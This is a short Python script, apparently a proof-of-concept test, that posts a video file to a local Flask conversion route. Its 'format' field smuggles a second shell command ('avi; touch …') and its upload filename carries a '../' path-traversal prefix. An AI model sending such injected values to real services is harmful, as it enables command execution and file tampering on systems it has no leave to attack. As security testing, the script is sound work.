import requests

# Set the URL for the Flask route
url = 'http://localhost:5000/convert'

# Set the file and format parameters
files = {'media_file': ("../chaud_chaud_chaud.mp4", open('../input_file.mp4', 'rb'))}
data = {'format': 'avi; touch coucou_la_faille.txt'}

# Send a POST request to the Flask route with the file and format parameters
response = requests.post(url, files=files, data=data)

# Check if the request was successful (200 status code)
if response.status_code == 200:
    # Save the converted file to disk
    with open('output_file.avi', 'wb') as f:
        f.write(response.content)
    print('File conversion successful!')
else:
    print('File conversion failed with status code:', response.status_code)
